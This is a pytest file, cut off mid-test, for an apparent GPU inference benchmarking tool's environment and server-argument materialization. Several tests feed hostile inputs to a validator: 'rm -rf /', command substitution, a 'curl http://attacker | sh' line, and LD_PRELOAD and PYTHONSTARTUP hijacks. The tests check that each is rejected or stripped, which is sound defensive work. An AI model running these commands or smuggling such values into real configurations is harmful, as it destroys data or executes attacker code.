# SPDX-FileCopyrightText: 2026 Advanced Micro Devices, Inc.
# SPDX-License-Identifier: MIT

"""Branch-coverage tests for shared workload-env materialization: GPU-count
detection, profile-window math, per-model work-arounds, and NUM_PROMPTS
sizing."""

from __future__ import annotations

import json
import sys
from types import SimpleNamespace

import pytest
import yaml

from hyperloom.orchestrator.actions.executors import _workload_envs as we
from hyperloom.orchestrator.actions.executors._grid_server_args import validate_server_args_shell_safe


def _clear_env(monkeypatch):
    for k in (
        "TP",
        "EP",
        "ISL",
        "OSL",
        "CONC",
        "MAX_MODEL_LEN",
        "PRECISION",
        "RANDOM_RANGE_RATIO",
        "ROCR_VISIBLE_DEVICES",
        "RUN_EVAL",
        "PROFILE",
        "MODEL_PATH",
        "INFERENCEX_PATH",
        "HYPERLOOM_PROFILE_MAX_ITERS",
        "HYPERLOOM_PROFILE_DELAY_ITERS",
        "HYPERLOOM_PROFILE_MAX_STEPS_CAP",
        "PROFILE_OSL",
        "INFERENCE_OPTIMIZER_VISIBLE_GPU_COUNT",
        "INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP",
        "XDIT_QUALITY_REF",
        "XDIT_QUALITY_REF_WRITE",
    ):
        monkeypatch.delenv(k, raising=False)


def _write(path, **bench_extra):
    bench = {"framework": "sglang", "model": "/m", "envs": {}}
    bench.update(bench_extra)
    path.write_text(yaml.safe_dump({"benchmark": bench}), encoding="utf-8")
    return path


def _materialize(src, out, **kw):
    res = we.materialize_config_with_envs(src, out, **kw)
    return yaml.safe_load(res.read_text())["benchmark"]


def _seed_reference_envs(tmp_path, monkeypatch, envs):
    """Pin a session whose SharedState carries ``reference_envs``."""
    from hyperloom.orchestrator.state.shared_state import SharedState

    sd = tmp_path / "session"
    sd.mkdir(parents=True, exist_ok=True)
    SharedState(session_id="ref-test", reference_envs=dict(envs)).save(sd)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_CURRENT_SESSION_DIR", str(sd))


def _stub_server_arg_injectors(monkeypatch):
    monkeypatch.setattr(we, "inject_sglang_context_length", lambda args, *a, **k: args)
    monkeypatch.setattr(we, "inject_sglang_watchdog_timeout", lambda args, *a, **k: args)
    monkeypatch.setattr(we, "inject_sglang_attention_backend", lambda args, *a, **k: args)
    monkeypatch.setattr(we, "inject_sglang_moe_runner_backend", lambda args, *a, **k: args)


def test_validate_server_args_rejects_bare_positionals():
    assert validate_server_args_shell_safe("--flag value --other=value") == "--flag value --other=value"
    with pytest.raises(ValueError, match="bare positional"):
        validate_server_args_shell_safe("stray --flag value")


def test_validate_server_args_allows_multi_value_flags():
    """argparse ``nargs="+"`` flags carry several values; the sink must accept them.

    ``--cuda-graph-bs`` is a real sglang invocation and is already listed in
    ``_MULTI_VALUE_FLAGS``. Rejecting the second value here made the integrate
    sink refuse recipes the explore side had already run.
    """
    args = "--cuda-graph-bs 1 2 4 8 16 24 32 48 64"
    assert validate_server_args_shell_safe(args) == args
    # A flag not on the whitelist still gets its value plus a numeric list, so
    # an nargs="+" flag nobody has enumerated yet is not rejected either.
    assert validate_server_args_shell_safe("--a 1 2 --b=3 --c x") == "--a 1 2 --b=3 --c x"


def test_validate_server_args_still_catches_positionals_after_a_flag():
    """The multi-value relaxation must not become "one flag opens the gates".

    A first pass tracked only "have we seen any flag", so every bare token after
    the first flag was accepted -- which is no check at all for the argv shapes
    this guard exists to reject.
    """
    with pytest.raises(ValueError, match="bare positional"):
        # --port=8000 already carries its value; run.sh is positional.
        validate_server_args_shell_safe("--port=8000 run.sh")
    with pytest.raises(ValueError, match="bare positional"):
        # --foo consumes bar; payload.json after it is not a value list.
        validate_server_args_shell_safe("--foo bar payload.json")
    with pytest.raises(ValueError, match="bare positional"):
        # Being on the multi-value whitelist widens how MANY values a flag
        # takes, not what they may look like: every entry on that list is a
        # list of batch sizes.
        validate_server_args_shell_safe("--cuda-graph-bs 1 2 run.sh")


@pytest.mark.parametrize(
    "args",
    [
        "--flag value; rm -rf /",
        "--flag `whoami`",
        "--flag $(id)",
        "--flag a|b",
        "--flag a>b",
    ],
)
def test_validate_server_args_still_blocks_shell_control(args):
    with pytest.raises(ValueError, match="shell control characters"):
        validate_server_args_shell_safe(args)


def test_materialize_remove_args_and_string_unset_env(tmp_path, monkeypatch):
    _clear_env(monkeypatch)
    src = tmp_path / "base.yaml"
    _write(
        src,
        envs={
            "EXTRA_SGLANG_ARGS": "--bad-base 1 --keep-base 2",
            "SGLANG_REMOVE_ME": "1",
        },
    )
    bench = _materialize(
        src,
        tmp_path / "out",
        extra_server_args="--variant 4",
        extra_envs={"SGLANG_REMOVE_ME": "override"},
        remove_args="--bad-base",
        unset_envs="SGLANG_REMOVE_ME",
    )
    envs = bench["envs"]
    assert "--bad-base" not in envs["EXTRA_SGLANG_ARGS"]
    assert "--keep-base 2" in envs["EXTRA_SGLANG_ARGS"]
    assert "--variant 4" in envs["EXTRA_SGLANG_ARGS"]
    assert envs["SGLANG_REMOVE_ME"] == "override"


def test_materialize_drops_unsafe_env_keys_but_preserves_workload_knobs(tmp_path, monkeypatch):
    _clear_env(monkeypatch)
    _stub_server_arg_injectors(monkeypatch)
    src = tmp_path / "base.yaml"
    _write(src)
    _seed_reference_envs(
        tmp_path,
        monkeypatch,
        {
            "DEEPSEEK_API_KEY": "deepseek-secret",
            "PYTHONPATH": "/tmp/evil",
            "REFERENCE_ONLY_KNOB": "1",
            "VLLM_ROCM_USE_AITER": "1",
            "bad key": "dropped",
        },
    )
    bench = _materialize(
        src,
        tmp_path / "out",
        extra_envs={
            "ANTHROPIC_API_KEY": "anthropic-secret",
            "LD_PRELOAD": "/tmp/evil.so",
            "LLM_GATEWAY_KEY": "gateway-secret",
            "OPENAI_API_KEY": "secret",
            "PYTHONSTARTUP": "/tmp/pwn.py",
            "SGLANG_USE_AITER": "1",
            "UNKNOWN_VALID_TUNING_KNOB": "enabled",
            "BAD-NAME": "dropped",
        },
    )
    envs = bench["envs"]
    assert "ANTHROPIC_API_KEY" not in envs
    assert "LLM_GATEWAY_KEY" not in envs
    assert "OPENAI_API_KEY" not in envs
    assert "DEEPSEEK_API_KEY" not in envs
    assert "LD_PRELOAD" not in envs
    assert "PYTHONSTARTUP" not in envs
    assert "BAD-NAME" not in envs
    assert "bad key" not in envs
    assert envs["REFERENCE_ONLY_KNOB"] == "1"
    assert envs["SGLANG_USE_AITER"] == "1"
    assert envs["UNKNOWN_VALID_TUNING_KNOB"] == "enabled"
    assert envs["VLLM_ROCM_USE_AITER"] == "1"


def test_materialize_rejects_shell_control_in_server_args(tmp_path, monkeypatch):
    _clear_env(monkeypatch)
    _stub_server_arg_injectors(monkeypatch)
    src = tmp_path / "base.yaml"
    _write(src)
    with pytest.raises(ValueError, match="shell control"):
        _materialize(
            src,
            tmp_path / "out",
            extra_server_args="--dtype bfloat16; curl http://attacker | sh",
        )


# ---- _visible_gpu_count ---------------------------------------------------
def test_visible_gpu_count_override_valid(monkeypatch):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_VISIBLE_GPU_COUNT", "4")
    assert we._visible_gpu_count() == 4


def test_visible_gpu_count_override_invalid_then_torch(monkeypatch):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_VISIBLE_GPU_COUNT", "not-int")
    fake_torch = SimpleNamespace(cuda=SimpleNamespace(device_count=lambda: 2))
    monkeypatch.setitem(sys.modules, "torch", fake_torch)
    assert we._visible_gpu_count() == 2


def test_visible_gpu_count_rocm_smi(monkeypatch):
    _clear_env(monkeypatch)
    fake_torch = SimpleNamespace(cuda=SimpleNamespace(device_count=lambda: 0))
    monkeypatch.setitem(sys.modules, "torch", fake_torch)
    monkeypatch.setattr(we.shutil, "which", lambda name: "/usr/bin/rocm-smi")
    out = "GPU[0]\t: foo\nGPU[0]\t: bar\nGPU[1]\t: baz\nother\n"
    monkeypatch.setattr(we.subprocess, "run", lambda *a, **k: SimpleNamespace(returncode=0, stdout=out))
    assert we._visible_gpu_count() == 2


def test_visible_gpu_count_rocm_smi_error(monkeypatch):
    _clear_env(monkeypatch)
    fake_torch = SimpleNamespace(cuda=SimpleNamespace(device_count=lambda: 0))
    monkeypatch.setitem(sys.modules, "torch", fake_torch)
    monkeypatch.setattr(we.shutil, "which", lambda name: "/usr/bin/rocm-smi")

    def _raise(*a, **k):
        raise OSError("denied")

    monkeypatch.setattr(we.subprocess, "run", _raise)
    assert we._visible_gpu_count() == 0


def test_default_baseline_config(monkeypatch):
    monkeypatch.setenv("FRAMEWORK", "atom")
    assert we.default_baseline_config().name == "baseline_atom.yaml"
    monkeypatch.setenv("FRAMEWORK", "vllm")
    assert we.default_baseline_config().name == "baseline_vllm.yaml"
    monkeypatch.setenv("FRAMEWORK", "weird")
    assert we.default_baseline_config().name == "baseline_sglang.yaml"


def test_precision_and_gpu_type_no_framework_agent(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("PRECISION", "fp8")
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    src = tmp_path / "cfg.yaml"
    # framework empty -> gpu_type branch pops benchmark_script
    src.write_text(
        yaml.safe_dump({"benchmark": {"model": "/m", "envs": {}, "benchmark_script": "old.sh"}}), encoding="utf-8"
    )
    bench = _materialize(src, tmp_path / "out", gpu_type="mi300x")
    assert bench["precision"] == "fp8"
    assert "benchmark_script" not in bench


def test_rocr_derives_tp(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("ROCR_VISIBLE_DEVICES", "0,1,2")
    src = _write(tmp_path / "cfg.yaml")
    bench = _materialize(src, tmp_path / "out")
    assert bench["envs"]["TP"] == 3


@pytest.mark.parametrize(
    "isl,osl,conc,factor",
    [
        (4000, 2000, 8, 3),  # 4096 < seq <= 16384 -> factor 3
        (3000, 1000, 8, 5),  # 1024 < seq <= 4096 -> factor 5
        (20000, 5000, 8, 2),  # > 16384 -> factor 2
    ],
)
def test_num_prompts_factor(monkeypatch, tmp_path, isl, osl, conc, factor):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("ISL", str(isl))
    monkeypatch.setenv("OSL", str(osl))
    monkeypatch.setenv("CONC", str(conc))
    src = _write(tmp_path / "cfg.yaml")
    bench = _materialize(src, tmp_path / "out")
    assert bench["envs"]["NUM_PROMPTS"] == conc * factor


def test_server_args_merge_existing(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    src = _write(tmp_path / "cfg.yaml", envs={"EXTRA_SGLANG_ARGS": "--mem-fraction-static 0.9"})
    bench = _materialize(src, tmp_path / "out", extra_server_args="--chunked-prefill-size 2048")
    merged = bench["envs"]["EXTRA_SGLANG_ARGS"]
    assert "mem-fraction-static" in merged
    assert "chunked-prefill-size" in merged


def test_vllm_ep_injects_expert_parallel(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("EP", "8")
    src = _write(tmp_path / "cfg.yaml", framework="vllm", envs={"EXTRA_VLLM_ARGS": "--trust-remote-code"})

    bench = _materialize(src, tmp_path / "out")

    args = bench["envs"]["EXTRA_VLLM_ARGS"]
    assert "--trust-remote-code" in args
    assert "--enable-expert-parallel" in args


def test_vllm_ep_one_does_not_inject_expert_parallel(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("EP", "1")
    src = _write(tmp_path / "cfg.yaml", framework="vllm", envs={"EXTRA_VLLM_ARGS": "--trust-remote-code"})

    bench = _materialize(src, tmp_path / "out")

    args = bench["envs"]["EXTRA_VLLM_ARGS"]
    assert "--trust-remote-code" in args
    assert "--enable-expert-parallel" not in args


def test_vllm_ep_preserves_profile_args(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("EP", "8")
    src = _write(
        tmp_path / "cfg.yaml",
        framework="vllm",
        envs={"EXTRA_VLLM_ARGS": "--profiler-config.ignore_frontend True"},
    )

    bench = _materialize(src, tmp_path / "out")

    args = bench["envs"]["EXTRA_VLLM_ARGS"]
    assert "--profiler-config.ignore_frontend True" in args
    assert "--enable-expert-parallel" in args


def test_vllm_ep_does_not_duplicate_existing_flag(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("EP", "8")
    src = _write(
        tmp_path / "cfg.yaml",
        framework="vllm",
        envs={"EXTRA_VLLM_ARGS": "--enable-expert-parallel"},
    )

    bench = _materialize(src, tmp_path / "out")

    args = bench["envs"]["EXTRA_VLLM_ARGS"]
    assert args.count("--enable-expert-parallel") == 1


@pytest.mark.parametrize(
    "server_args, framework, ep, expected",
    [
        ("--foo", "vllm", 8, "--foo --enable-expert-parallel"),
        ("--foo", "vllm", 1, "--foo"),
        ("--foo", "sglang", 8, "--foo"),
        ("--foo", "vllm", "bad", "--foo"),
        ("--foo", "vllm", None, "--foo"),
        ("--enable-expert-parallel", "vllm", 8, "--enable-expert-parallel"),
        ("", "vllm", 8, "--enable-expert-parallel"),
    ],
)
def test_inject_vllm_expert_parallel_unit(server_args, framework, ep, expected):
    assert we.inject_vllm_expert_parallel(server_args, framework, ep) == expected


def test_mimo_v2_injects_triton_attention(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    src = _write(tmp_path / "cfg.yaml")
    bench = _materialize(src, tmp_path / "out", model_path="/path/models/MiMo-V2-7B")
    assert "attention-backend triton" in bench["envs"]["EXTRA_SGLANG_ARGS"]


def _write_sparse_model_dir(tmp_path, *, sparse_block_size=128, nested=False, name="model"):
    """Write a minimal model dir whose config.json declares a sparse block size.

    ``nested`` places ``sparse_attention_config`` under ``text_config`` (the
    multimodal-wrapper layout) to exercise the merged-scope read path.
    """
    d = tmp_path / name
    d.mkdir(exist_ok=True)
    sparse = {"sparse_attention_config": {"sparse_block_size": sparse_block_size}}
    cfg: dict = {"model_type": "minimax_m3"}
    cfg.update({"text_config": sparse} if nested else sparse)
    (d / "config.json").write_text(json.dumps(cfg), encoding="utf-8")
    return str(d)


def test_sparse_model_injects_block_size_from_config_vllm(monkeypatch, tmp_path):
    # Config-derived: any model declaring sparse_attention_config.sparse_block_size
    # gets that value as vLLM --block-size (default 16 aborts KV-cache init).
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    model_dir = _write_sparse_model_dir(tmp_path, sparse_block_size=128)
    src = _write(tmp_path / "cfg.yaml", framework="vllm")
    bench = _materialize(src, tmp_path / "out", model_path=model_dir)
    assert "--block-size 128" in bench["envs"]["EXTRA_VLLM_ARGS"]


def test_sparse_block_size_read_from_nested_text_config(monkeypatch, tmp_path):
    # sparse_attention_config nested under text_config (multimodal wrapper); the
    # value is model-derived, not hardcoded (here 64 to prove it is read).
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    model_dir = _write_sparse_model_dir(tmp_path, sparse_block_size=64, nested=True)
    src = _write(tmp_path / "cfg.yaml", framework="vllm")
    bench = _materialize(src, tmp_path / "out", model_path=model_dir)
    assert "--block-size 64" in bench["envs"]["EXTRA_VLLM_ARGS"]


def test_dense_model_no_block_size_injection(monkeypatch, tmp_path):
    # No sparse_attention_config -> nothing injected (dense models untouched).
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    d = tmp_path / "dense"
    d.mkdir()
    (d / "config.json").write_text(json.dumps({"model_type": "llama"}), encoding="utf-8")
    src = _write(tmp_path / "cfg.yaml", framework="vllm")
    bench = _materialize(src, tmp_path / "out", model_path=str(d))
    assert "block-size" not in bench["envs"].get("EXTRA_VLLM_ARGS", "")


def test_sparse_model_block_size_not_injected_for_sglang(monkeypatch, tmp_path):
    # --block-size is a vLLM flag; sglang rejects it, so the injection is
    # vLLM-scoped and must never touch a sglang run.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    model_dir = _write_sparse_model_dir(tmp_path, sparse_block_size=128)
    src = _write(tmp_path / "cfg.yaml", framework="sglang")
    bench = _materialize(src, tmp_path / "out", model_path=model_dir)
    assert "block-size" not in bench["envs"].get("EXTRA_SGLANG_ARGS", "")
    assert "block-size" not in bench["envs"].get("EXTRA_VLLM_ARGS", "")


def test_sparse_model_respects_operator_pinned_block_size(monkeypatch, tmp_path):
    # An explicit operator/explore --block-size wins; we must not append a
    # second conflicting --block-size.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    model_dir = _write_sparse_model_dir(tmp_path, sparse_block_size=128)
    src = _write(tmp_path / "cfg.yaml", framework="vllm")
    bench = _materialize(src, tmp_path / "out", model_path=model_dir, extra_server_args="--block-size 64")
    assert "--block-size 64" in bench["envs"]["EXTRA_VLLM_ARGS"]
    assert "--block-size 128" not in bench["envs"]["EXTRA_VLLM_ARGS"]


def test_run_eval_from_env(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("RUN_EVAL", "true")
    src = _write(tmp_path / "cfg.yaml")
    bench = _materialize(src, tmp_path / "out")
    assert bench["envs"]["RUN_EVAL"] == "true"


def test_run_eval_defaults_true(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    src = _write(tmp_path / "cfg.yaml")
    bench = _materialize(src, tmp_path / "out")
    assert bench["envs"]["RUN_EVAL"] == "true"


def test_run_eval_explicit_false_warns_not_blocks(monkeypatch, tmp_path, caplog):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("RUN_EVAL", "false")
    monkeypatch.setattr(we, "_RUN_EVAL_DISABLED_WARN_EMITTED", False)
    src = _write(tmp_path / "cfg.yaml")
    with caplog.at_level("WARNING"):
        bench = _materialize(src, tmp_path / "out")
    assert bench["envs"]["RUN_EVAL"] == "false"
    assert any("RUN_EVAL is disabled" in r.message for r in caplog.records)


def test_profile_negative_delay_clamped(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("ISL", "1")
    monkeypatch.setenv("OSL", "1")
    monkeypatch.setenv("CONC", "8")
    # PROFILE triggers is_profile; bad RANDOM_RANGE_RATIO hits the except branch.
    src = _write(tmp_path / "cfg.yaml", envs={"PROFILE": "1", "RANDOM_RANGE_RATIO": "not-a-float"})
    bench = _materialize(src, tmp_path / "out")
    assert "NUM_PROMPTS" in bench["envs"]


def test_profile_max_iters_override(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("HYPERLOOM_PROFILE_MAX_ITERS", "8")
    monkeypatch.setenv("HYPERLOOM_PROFILE_DELAY_ITERS", "4")
    src = _write(tmp_path / "cfg.yaml", envs={"PROFILE": "1"})
    bench = _materialize(src, tmp_path / "out")
    assert "NUM_PROMPTS" in bench["envs"]


def test_profile_atom_defers(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    src = tmp_path / "cfg.yaml"
    src.write_text(
        yaml.safe_dump({"benchmark": {"framework": "atom", "model": "/m", "envs": {"PROFILE": "1"}}}), encoding="utf-8"
    )
    bench = _materialize(src, tmp_path / "out")
    # atom defers NUM_PROMPTS to Magpie, taking the factor path.
    assert "NUM_PROMPTS" in bench["envs"]


def test_profile_sglang_bad_extra_body(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    src = _write(tmp_path / "cfg.yaml", envs={"PROFILE": "1", "PROFILE_EXTRA_BODY": "{bad json"})
    bench = _materialize(src, tmp_path / "out")
    body = bench["envs"]["PROFILE_EXTRA_BODY"]
    assert "start_step" in body and "num_steps" in body


def _profile_num_steps(bench) -> int:
    """Captured-step count the sglang profile path writes into PROFILE_EXTRA_BODY."""
    import json

    return int(json.loads(bench["envs"]["PROFILE_EXTRA_BODY"])["num_steps"])


def test_profile_default_caps_steps_and_osl(monkeypatch, tmp_path):
    # No PROFILE_OSL: capture capped at 128, profile OSL defaults to min(OSL, 1024).
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("OSL", "8192")
    monkeypatch.setenv("CONC", "64")
    src = _write(tmp_path / "cfg.yaml", envs={"PROFILE": "1"})
    bench = _materialize(src, tmp_path / "out")
    assert bench["envs"]["OSL"] == 1024  # min(8192, 1024)
    assert _profile_num_steps(bench) == 128  # default cap


def test_profile_explicit_profile_osl_honored(monkeypatch, tmp_path):
    # PROFILE_OSL overrides the profile OSL verbatim.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("OSL", "8192")
    monkeypatch.setenv("CONC", "64")
    monkeypatch.setenv("PROFILE_OSL", "512")
    src = _write(tmp_path / "cfg.yaml", envs={"PROFILE": "1"})
    bench = _materialize(src, tmp_path / "out")
    assert bench["envs"]["OSL"] == 512
    assert _profile_num_steps(bench) == 128


def test_profile_steps_cap_env_override(monkeypatch, tmp_path):
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("OSL", "1024")
    monkeypatch.setenv("CONC", "64")
    monkeypatch.setenv("HYPERLOOM_PROFILE_MAX_STEPS_CAP", "256")
    src = _write(tmp_path / "cfg.yaml", envs={"PROFILE": "1"})
    bench = _materialize(src, tmp_path / "out")
    assert _profile_num_steps(bench) == 256


def test_profile_high_osl_low_conc_auto_lowers_osl(monkeypatch, tmp_path, caplog):
    # Low CONC pushes the steady-state floor above the cap, so the auto path
    # lowers the profile OSL until the floor fits the 128-step cap.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("OSL", "8192")
    monkeypatch.setenv("CONC", "4")
    src = _write(tmp_path / "cfg.yaml", envs={"PROFILE": "1"})
    with caplog.at_level("WARNING"):
        bench = _materialize(src, tmp_path / "out")
    # fitted = int(128 * 2 * 4 / (1 + 1)) = 512; floor(512, conc=4) = 128 <= 128.
    assert bench["envs"]["OSL"] == 512
    assert _profile_num_steps(bench) == 128
    assert any("lowering profile OSL" in r.message for r in caplog.records)


def test_profile_manual_max_iters_below_floor_warns(monkeypatch, tmp_path, caplog):
    # An explicit too-small capture is honored but warned about.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("OSL", "1024")
    monkeypatch.setenv("CONC", "8")
    monkeypatch.setenv("HYPERLOOM_PROFILE_MAX_ITERS", "8")
    src = _write(tmp_path / "cfg.yaml", envs={"PROFILE": "1"})
    with caplog.at_level("WARNING"):
        bench = _materialize(src, tmp_path / "out")
    assert _profile_num_steps(bench) == 8  # honored verbatim
    assert any("below the steady-state floor" in r.message for r in caplog.records)


def test_profile_explicit_osl_over_cap_warns_not_lowered(monkeypatch, tmp_path, caplog):
    # Explicit PROFILE_OSL whose steady floor exceeds the cap is honored as-is,
    # but a warning is emitted.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("OSL", "1024")
    monkeypatch.setenv("CONC", "4")
    monkeypatch.setenv("PROFILE_OSL", "8192")
    src = _write(tmp_path / "cfg.yaml", envs={"PROFILE": "1"})
    with caplog.at_level("WARNING"):
        bench = _materialize(src, tmp_path / "out")
    assert bench["envs"]["OSL"] == 8192  # not auto-lowered
    assert _profile_num_steps(bench) == 128
    assert any("above the profile cap" in r.message for r in caplog.records)


def test_profile_manual_max_iters_above_cap_warns(monkeypatch, tmp_path, caplog):
    # An explicit too-large capture is honored but warned about.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("OSL", "256")
    monkeypatch.setenv("CONC", "64")
    monkeypatch.setenv("HYPERLOOM_PROFILE_MAX_ITERS", "2000")
    src = _write(tmp_path / "cfg.yaml", envs={"PROFILE": "1"})
    with caplog.at_level("WARNING"):
        bench = _materialize(src, tmp_path / "out")
    assert _profile_num_steps(bench) == 2000  # honored verbatim
    assert any("exceeds the serialization-safe cap" in r.message for r in caplog.records)


def test_quality_ref_variant_compares(monkeypatch, tmp_path):
    # A non-baseline scriptable variant must COMPARE against the operator
    # reference and must NOT write.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("XDIT_QUALITY_REF", "/ref/q.png")
    src = _write(tmp_path / "cfg.yaml", framework="xdit", envs={"XDIT_QUALITY_REF": ""})
    bench = _materialize(src, tmp_path / "out")
    assert bench["envs"]["XDIT_QUALITY_REF"] == "/ref/q.png"
    assert bench["envs"]["XDIT_QUALITY_REF_WRITE"] == ""


def test_quality_ref_baseline_establishes(monkeypatch, tmp_path):
    # The baseline ESTABLISHES the reference: compare off and write it fresh.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("XDIT_QUALITY_REF", "/ref/q.png")
    src = _write(tmp_path / "cfg.yaml", framework="xdit", envs={"XDIT_QUALITY_REF": ""})
    bench = _materialize(src, tmp_path / "out", establish_quality_ref=True)
    assert bench["envs"]["XDIT_QUALITY_REF"] == ""
    assert bench["envs"]["XDIT_QUALITY_REF_WRITE"] == "/ref/q.png"


def test_quality_ref_baseline_write_env_override(monkeypatch, tmp_path):
    # Explicit XDIT_QUALITY_REF_WRITE wins over the derived path on baseline.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("XDIT_QUALITY_REF", "/ref/q.png")
    monkeypatch.setenv("XDIT_QUALITY_REF_WRITE", "/ref/write.png")
    src = _write(tmp_path / "cfg.yaml", framework="xdit", envs={"XDIT_QUALITY_REF": ""})
    bench = _materialize(src, tmp_path / "out", establish_quality_ref=True)
    assert bench["envs"]["XDIT_QUALITY_REF_WRITE"] == "/ref/write.png"


def test_quality_ref_profile_disabled_and_no_write(monkeypatch, tmp_path):
    # Profiling/roofline must never gate AND never write.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("XDIT_QUALITY_REF", "/ref/q.png")
    monkeypatch.setenv("XDIT_QUALITY_REF_WRITE", "/ref/q.png")
    src = _write(tmp_path / "cfg.yaml", framework="xdit", envs={"PROFILE": "1"})
    bench = _materialize(src, tmp_path / "out")
    assert bench["envs"]["XDIT_QUALITY_REF"] == ""
    assert bench["envs"]["XDIT_QUALITY_REF_WRITE"] == ""


def test_quality_ref_untouched_for_serving_framework(monkeypatch, tmp_path):
    # Serving frameworks inject no XDIT_QUALITY_* keys even when the env is set.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    monkeypatch.setenv("XDIT_QUALITY_REF", "/ref/q.png")
    src = _write(tmp_path / "cfg.yaml", framework="sglang", envs={})
    bench = _materialize(src, tmp_path / "out")
    assert "XDIT_QUALITY_REF" not in bench["envs"]
    assert "XDIT_QUALITY_REF_WRITE" not in bench["envs"]


def test_quality_ref_zero_config_variant_defaults_to_session_ref(monkeypatch, tmp_path):
    # No operator reference: a stable per-session reference is derived so the
    # gate stays active. A variant COMPAREs against it, never writes.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
    sess = tmp_path / "sess"
    monkeypatch.setenv("INFERENCE_OPTIMIZER_CURRENT_SESSION_DIR", str(sess))
    src = _write(tmp_path / "cfg.yaml", framework="xdit", envs={})
    bench = _materialize(src, tmp_path / "out")
    expected = str(sess / "storage" / "quality_ref" / "baseline.png")
    assert bench["envs"]["XDIT_QUALITY_REF"] == expected
    assert bench["envs"]["XDIT_QUALITY_REF_WRITE"] == ""


def test_quality_ref_zero_config_baseline_writes_session_ref(monkeypatch, tmp_path):
    # The baseline writes the derived per-session reference (compare off) so a
    # subsequent variant has something to gate against.
    _clear_env(monkeypatch)
    monkeypatch.setenv("INFERENCE_OPTIMIZER_DISABLE_TP_CLAMP", "1")
